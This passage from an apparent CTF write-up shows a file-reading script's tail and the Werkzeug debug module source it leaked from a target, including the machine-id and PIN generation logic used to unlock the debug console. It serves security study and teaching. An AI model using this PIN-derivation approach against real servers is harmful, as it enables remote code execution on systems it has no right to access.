cal==<span class="string">&#x27;        None&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将特殊符号转码成正常</span></span><br><span class="line">    cal = html.unescape(cal)</span><br><span class="line">    <span class="built_in">print</span>(cal)</span><br></pre></td></tr></table></figure>

<p>跑出该文件:<br>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;werkzeug&#x2F;debug&#x2F;<strong>init</strong>.py</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">import</span> getpass</span><br><span class="line">        <span class="keyword">import</span> hashlib</span><br><span class="line">        <span class="keyword">import</span> json</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">import</span> pkgutil</span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        <span class="keyword">import</span> sys</span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        <span class="keyword">import</span> typing <span class="keyword">as</span> t</span><br><span class="line">        <span class="keyword">import</span> uuid</span><br><span class="line">        <span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">        <span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">        <span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line">        <span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line">        <span class="keyword">from</span> zlib <span class="keyword">import</span> adler32</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> .._internal <span class="keyword">import</span> _log</span><br><span class="line">        <span class="keyword">from</span> ..exceptions <span class="keyword">import</span> NotFound</span><br><span class="line">        <span class="keyword">from</span> ..http <span class="keyword">import</span> parse_cookie</span><br><span class="line">        <span class="keyword">from</span> ..security <span class="keyword">import</span> gen_salt</span><br><span class="line">        <span class="keyword">from</span> ..utils <span class="keyword">import</span> send_file</span><br><span class="line">        <span class="keyword">from</span> ..wrappers.request <span class="keyword">import</span> Request</span><br><span class="line">        <span class="keyword">from</span> ..wrappers.response <span class="keyword">import</span> Response</span><br><span class="line">        <span class="keyword">from</span> .console <span class="keyword">import</span> Console</span><br><span class="line">        <span class="keyword">from</span> .tbtools <span class="keyword">import</span> DebugFrameSummary</span><br><span class="line">        <span class="keyword">from</span> .tbtools <span class="keyword">import</span> DebugTraceback</span><br><span class="line">        <span class="keyword">from</span> .tbtools <span class="keyword">import</span> render_console_html</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> t.TYPE_CHECKING:</span><br><span class="line">            <span class="keyword">from</span> _typeshed.wsgi <span class="keyword">import</span> StartResponse</span><br><span class="line">            <span class="keyword">from</span> _typeshed.wsgi <span class="keyword">import</span> WSGIApplication</span><br><span class="line">            <span class="keyword">from</span> _typeshed.wsgi <span class="keyword">import</span> WSGIEnvironment</span><br><span class="line"></span><br><span class="line">        <span class="comment"># A week</span></span><br><span class="line">        PIN_TIME = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        _machine_id: t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">            <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">                linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">                <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            value = f.readline().strip()</span><br><span class="line">                    <span class="keyword">except</span> OSError:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> value:</span><br><span class="line">                        linux += value</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">                <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">                <span class="comment"># relatively stable across boots.</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">except</span> OSError:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> linux:</span><br><span class="line">                    <span class="keyword">return</span> linux</span><br><span class="line"></span><br><span class="line">                <span class="comment"># On OS X, use ioreg to get the computer&#x27;s serial number.</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># subprocess may not be available, e.g. Google App Engine</span></span><br><span class="line">                    <span class="comment"># https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">                    <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">                    dump = Popen(</span><br><span class="line">                        [<span class="string">&quot;ioreg&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;2&quot;</span>], stdout=PIPE</span><br><span class="line">                    ).communicate()[<span class="number">0</span>]</span><br><span class="line">                    match = re.search(<span class="string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># On Windows, use winreg to get the machine guid.</span></span><br><span class="line">                <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span>:</span><br><span class="line">                    <span class="keyword">import</span> winreg</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">with</span> winreg.OpenKey(</span><br><span class="line">                            winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                            <span class="string">&quot;SOFTWARE\Microsoft\Cryptography&quot;</span>,</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            winreg.KEY_READ | winreg.KEY_WOW64_64KEY,</span><br><span class="line">                        ) <span class="keyword">as</span> rk:</span><br><span class="line">                            guid: t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]</span><br><span class="line">                            guid_type: <span class="built_in">int</span></span><br><span class="line">                            guid, guid_type = winreg.QueryValueEx(rk, <span class="string">&quot;MachineGuid&quot;</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> guid_type == winreg.REG_SZ:</span><br><span class="line">                                <span class="keyword">return</span> guid.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> guid</span><br><span class="line">                    <span class="keyword">except</span> OSError:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            _machine_id = _generate()</span><br><span class="line">            <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">_ConsoleFrame</span>:</span><br><span class="line">            <span class="string">&quot;&quot;&quot;Helper class so that we can reuse the frame console code for the</span></span><br><span class="line"><span class="string">            standalone console.</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, namespace: t.<span class="type">Dict</span>[<span class="built_in">str</span>, t.<span class="type">Any</span>]</span>):</span><br><span class="line">                self.console = Console(namespace)</span><br><span class="line">                self.<span class="built_in">id</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">eval</span>(<span class="params">self, code: <span class="built_in">str</span></span>) -&gt; t.<span class="type">Any</span>:</span><br><span class="line">                <span class="keyword">return</span> self.console.<span class="built_in">eval</span>(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">            app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params">        </span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">            <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">            code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">            restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">            was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">            pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">            rv = <span class="literal">None</span></span><br><span class="line">            num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">            <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">            <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdigit():</span><br><span class="line">                <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">                    rv = pin</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    num = pin</span><br><span class="line"></span><br><span class="line">            modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">            username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">                <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">                <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">                username = getpass.getuser()</span><br><span class="line">            <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">                username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">            <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">            probably_public_bits = [</span><br><span class="line">                username,</span><br><span class="line">                modname,</span><br><span class="line">                <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">                <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">            <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">            <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">            private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">            h = hashlib.sha1()</span><br><span class="line">            <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">                    bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                h.update(bit)</span><br><span class="line">            h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">            cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">            <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">            <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">                num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">            <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">            <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                        rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                            num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                        )</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    rv = num</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rv, cookie_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">DebuggedApplication</span>:</span><br><span class="line">            <span class="string">&quot;&quot;&quot;Enables debugging support for a given application::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                from werkzeug.debug import DebuggedApplication</span></span><br><span class="line"><span class="string">                from myapp import app</span></span><br><span class="line"><span class="string">                app = DebuggedApplication(app, evalex=True)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            The `evalex` keyword argument allows evaluating expressions in a</span></span><br><span class="line"><span class="string">            traceback&#x27;s frame context.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            :param app: the WSGI application to run debugged.</span></span><br><span class="line"><span class="string">            :param evalex: enable exception evaluation feature (interactive</span></span><br><span class="line"><span class="string">                           debugging).  This requires a non-forking server.</span></span><br><span class="line"><span class="string">            :param request_key: The key that points to the request object in this</span></span><br><span class="line"><span class="string">                                environment.  This parameter is ignored in current</span></span><br><span class="line"><span class="string">                                versions.</span></span><br><span class="line"><span class="string">            :param console_path: the URL for a general purpose console.</span></span><br><span class="line"><span class="string">            :param console_init_func: the function that is executed before starting</span></span><br><span class="line"><span class="string">                                      the general purpose console.  The return value</span></span><br><span class="line"><span class="string">                                      is used as initial namespace.</span></span><br><span class="line"><span class="string">            :param show_hidden_frames: by default hidden traceback frames are skipped.</span></span><br><span class="line"><span class="string">                                       You can show them by setting this parameter</span></span><br><span class="line"><span class="string">                                       to `True`.</span></span><br><span class="line"><span class="string">            :param pin_security: can be used to disable the pin based security system.</span></span><br><span class="line"><span class="string">            :param pin_logging: enables the logging of the pin system.</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            _pin: <span class="built_in">str</span></span><br><span class="line">            _pin_cookie: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">                self,</span></span><br><span class="line"><span class="params">                app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params">                evalex: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                request_key: <span class="built_in">str</span> = <span class="string">&quot;werkzeug.request&quot;</span>,</span></span><br><span class="line"><span class="params">                console_path: <span class="built_in">str</span> = <span class="string">&quot;/console&quot;</span>,</span></span><br><span class="line"><span class="params">                console_init_func: t.<span class="type">Optional</span>[t.<span class="type">Callable</span>[[], t.<span class="type">Dict</span>[<span class="built_in">str</span>, t.<span class="type">Any</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                